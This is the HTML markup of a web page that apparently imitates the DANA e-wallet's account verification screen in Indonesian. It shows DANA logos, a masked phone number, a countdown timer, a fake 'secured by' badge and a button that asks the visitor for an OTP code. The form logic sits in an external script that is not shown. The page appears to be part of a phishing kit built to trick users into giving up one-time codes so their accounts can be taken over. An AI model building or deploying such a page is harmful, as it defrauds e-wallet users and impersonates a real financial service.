<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Verifikasi</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="stylesheet" href="css/tap.css">
  <link rel="icon" href="assets/favicon.png" type="image/png">
</head>
<body>

<!-- HEADER -->
<div class="header">
  <img src="assets/danaheader.png" class="logo">
</div>

<!-- CARD -->
<div class="card">

  <h3>Verifikasi dikirim ke <b>DANA</b> Akun</h3>

  <div class="phone">
    <img src="assets/dana.png">
    <span>+628•••••••</span>
  </div>

  <!-- VIDEO -->
  <div class="video-box">
<video autoplay muted loop playsinline>
  <source src="https://res.cloudinary.com/dhmjwsjfc/video/upload/v1775475990/vidio11_s28ci2.mp4" type="video/mp4">
</video>
  </div>

  <!-- INFO -->
  <div class="info">

    <div class="item">
      <img src="assets/push-verify-step-receive-notification.svg">
      <p>Periksa melalui notifikasi yang dikirim ke HP / Perangkat Anda atau lihat Kotak Masuk.</p>
    </div>

    <div class="item">
      <img src="assets/push-verify-step-verification-success.svg">
      <p>Kemudian, kembali ke halaman ini untuk melanjutkan verifikasi Anda dan klik tombol Kode OTP</p>
    </div>

  </div>

 <p class="timer" id="timer">
  Waktu tersisa 01:00
</p>

  <button id="btnOtp" class="btn">KODE OTP</button>

 <div class="protection">
  <span>Diamankan oleh</span>
  <img src="assets/protec.png">
</div>

</div>

<script src="js/tap.js"></script>
</body>
</html>
